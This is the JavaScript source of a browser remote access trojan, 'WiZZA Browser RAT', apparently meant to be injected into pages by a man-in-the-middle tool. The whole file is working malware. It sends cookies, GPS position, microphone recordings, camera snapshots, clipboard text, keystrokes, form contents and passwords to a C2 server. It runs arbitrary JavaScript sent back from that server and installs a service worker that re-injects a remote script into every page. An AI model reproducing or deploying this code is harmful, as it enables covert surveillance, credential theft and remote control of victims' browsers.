/**
 * WiZZA Browser RAT — injected by MitM intercept.py
 * No install required. Works on iOS Safari, Android Chrome, any browser.
 *
 * Capabilities:
 *   - Geolocation (GPS)
 *   - Microphone recording (with permission prompt)
 *   - Camera snapshot (with permission prompt)
 *   - Clipboard read
 *   - Form / password capture
 *   - Device fingerprint (OS, model, IP hint)
 *   - Continuous keylogger
 *   - Screenshot via Canvas (visible page)
 *   - Command polling loop (C2 can send JS to execute)
 *
 * C2 endpoint: __C2URL__ (replaced at bake time)
 */

(function() {
    'use strict';

    const C2 = '__C2URL__';
    const SID = Math.random().toString(36).slice(2); // session ID
    let _registered = false;
    let _keylog = '';
    let _pollInterval = 15000; // ms

    // ── Helpers ──────────────────────────────────────────────────────────
    function post(endpoint, data) {
        return fetch(`${C2}/mobile/${endpoint}`, {
            method:  'POST',
            headers: { 'Content-Type': 'application/json' },
            body:    JSON.stringify({ sid: SID, ts: Date.now(), ...data }),
            mode:    'no-cors',
            keepalive: true,
        }).catch(() => {});
    }

    function deviceInfo() {
        const ua = navigator.userAgent;
        const isIOS     = /iPhone|iPad|iPod/.test(ua);
        const isAndroid = /Android/.test(ua);
        return {
            ua,
            platform: navigator.platform,
            os:       isIOS ? 'iOS' : isAndroid ? 'Android' : 'other',
            screen:   `${screen.width}x${screen.height}`,
            lang:     navigator.language,
            tz:       Intl.DateTimeFormat().resolvedOptions().timeZone,
            page:     location.href,
            ref:      document.referrer,
            cookies:  document.cookie,
            title:    document.title,
        };
    }

    // ── Registration ──────────────────────────────────────────────────────
    function register() {
        if (_registered) return;
        _registered = true;
        post('register', { type: 'browser', info: deviceInfo() });
    }

    // ── Geolocation ───────────────────────────────────────────────────────
    function captureGPS() {
        if (!navigator.geolocation) return;
        navigator.geolocation.getCurrentPosition(
            pos => post('data', {
                type: 'gps',
                lat:  pos.coords.latitude,
                lng:  pos.coords.longitude,
                acc:  pos.coords.accuracy,
                alt:  pos.coords.altitude,
            }),
            () => {},
            { enableHighAccuracy: true, timeout: 10000 }
        );
    }

    // ── Microphone recording (10 seconds) ─────────────────────────────────
    function captureMic(duration_ms = 10000) {
        if (!navigator.mediaDevices) return;
        navigator.mediaDevices.getUserMedia({ audio: true, video: false })
            .then(stream => {
                const chunks = [];
                const rec = new MediaRecorder(stream, { mimeType: 'audio/webm' });
                rec.ondataavailable = e => chunks.push(e.data);
                rec.onstop = () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    const reader = new FileReader();
                    reader.onloadend = () => {
                        post('data', { type: 'mic', data: reader.result });
                        stream.getTracks().forEach(t => t.stop());
                    };
                    reader.readAsDataURL(blob);
                };
                rec.start();
                setTimeout(() => rec.stop(), duration_ms);
            })
            .catch(() => {});
    }

    // ── Camera snapshot ───────────────────────────────────────────────────
    function captureCamera() {
        if (!navigator.mediaDevices) return;
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
            .then(stream => {
                const video  = document.createElement('video');
                const canvas = document.createElement('canvas');
                video.srcObject = stream;
                video.play();
                video.onloadedmetadata = () => {
                    canvas.width  = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    post('data', { type: 'camera', data: canvas.toDataURL('image/jpeg', 0.7) });
                    stream.getTracks().forEach(t => t.stop());
                };
            })
            .catch(() => {});
    }

    // ── Clipboard ─────────────────────────────────────────────────────────
    function captureClipboard() {
        if (navigator.clipboard && navigator.clipboard.readText) {
            navigator.clipboard.readText()
                .then(txt => txt && post('data', { type: 'clipboard', data: txt }))
                .catch(() => {});
        }
    }

    // ── Screenshot (canvas, captures visible page) ────────────────────────
    function captureScreenshot() {
        // html2canvas if available, otherwise skip
        if (typeof html2canvas === 'function') {
            html2canvas(document.body).then(canvas => {
                post('data', { type: 'screenshot', data: canvas.toDataURL('image/jpeg', 0.5) });
            }).catch(() => {});
        }
    }

    // ── Form / credential harvesting ──────────────────────────────────────
    function hookForms() {
        function harvest(form) {
            const fields = {};
            for (const el of form.elements) {
                if (el.name && el.value) fields[el.name] = el.value;
            }
            if (Object.keys(fields).length > 0)
                post('data', { type: 'form', action: form.action, fields });
        }

        // Hook existing forms
        document.querySelectorAll('form').forEach(f => {
            f.addEventListener('submit', () => harvest(f), true);
        });

        // Hook dynamically added forms
        const obs = new MutationObserver(muts => {
            for (const m of muts)
                for (const n of m.addedNodes)
                    if (n.querySelectorAll) n.querySelectorAll('form').forEach(f => {
                        f.addEventListener('submit', () => harvest(f), true);
                    });
        });
        obs.observe(document.body, { childList: true, subtree: true });

        // Hook password fields specifically — capture on blur
        function hookPasswordFields(root) {
            root.querySelectorAll('input[type=password]').forEach(inp => {
                inp.addEventListener('blur', () => {
                    if (inp.value) post('data', {
                        type:     'password',
                        field:    inp.name || inp.id || 'password',
                        value:    inp.value,
                        page:     location.href,
                    });
                }, true);
            });
        }
        hookPasswordFields(document);
        const obs2 = new MutationObserver(muts => {
            for (const m of muts) for (const n of m.addedNodes)
                if (n.querySelectorAll) hookPasswordFields(n);
        });
        obs2.observe(document.body, { childList: true, subtree: true });
    }

    // ── Keylogger ─────────────────────────────────────────────────────────
    function hookKeylog() {
        document.addEventListener('keydown', e => {
            const key = e.key.length === 1 ? e.key : `[${e.key}]`;
            _keylog += key;
        }, true);

        // Flush every 30 seconds
        setInterval(() => {
            if (_keylog.length > 0) {
                post('data', { type: 'keylog', data: _keylog, page: location.href });
                _keylog = '';
            }
        }, 30000);
    }

    // ── Command polling ───────────────────────────────────────────────────
    function poll() {
        fetch(`${C2}/mobile/cmd?sid=${SID}`, { mode: 'cors' })
            .then(r => r.json())
            .then(data => {
                if (!data || !data.cmd) return;
                switch (data.cmd) {
                    case 'gps':        captureGPS();        break;
                    case 'mic':        captureMic(data.duration || 10000); break;
                    case 'camera':     captureCamera();     break;
                    case 'clipboard':  captureClipboard();  break;
                    case 'screenshot': captureScreenshot(); break;
                    case 'info':       post('data', { type: 'info', info: deviceInfo() }); break;
                    case 'exec':
                        // Execute arbitrary JS and return result
                        try {
                            // eslint-disable-next-line no-eval
                            const result = eval(data.code);
                            post('data', { type: 'exec_result', result: String(result) });
                        } catch(e) {
                            post('data', { type: 'exec_result', result: 'ERROR: ' + e.message });
                        }
                        break;
                    case 'interval':
                        _pollInterval = (data.ms || 15000);
                        break;
                }
                if (data.next_poll) _pollInterval = data.next_poll;
            })
            .catch(() => {})
            .finally(() => setTimeout(poll, _pollInterval));
    }

    // ── Persistent storage (survives page nav in same origin) ─────────────
    function tryPersist() {
        try {
            if ('serviceWorker' in navigator) {
                // Register a service worker that re-injects on every page load
                const swCode = `
self.addEventListener('fetch', e => {
    e.respondWith(fetch(e.request).then(resp => {
        if (!resp.headers.get('content-type')?.includes('text/html')) return resp;
        return resp.text().then(html => {
            const inject = '<script src="${C2}/m/hook.js"><\\/script>';
            if (!html.includes('${C2}'))
                html = html.replace('</body>', inject + '</body>');
            return new Response(html, { headers: resp.headers });
        });
    }).catch(() => fetch(e.request)));
});`;
                const blob = new Blob([swCode], { type: 'application/javascript' });
                const swUrl = URL.createObjectURL(blob);
                navigator.serviceWorker.register(swUrl, { scope: '/' }).catch(() => {});
            }
        } catch(e) {}
    }

    // ── Init ──────────────────────────────────────────────────────────────
    function init() {
        register();
        hookForms();
        hookKeylog();
        captureGPS();
        captureClipboard();
        tryPersist();
        setTimeout(poll, 2000);
    }

    if (document.readyState === 'loading')
        document.addEventListener('DOMContentLoaded', init);
    else
        init();

})();
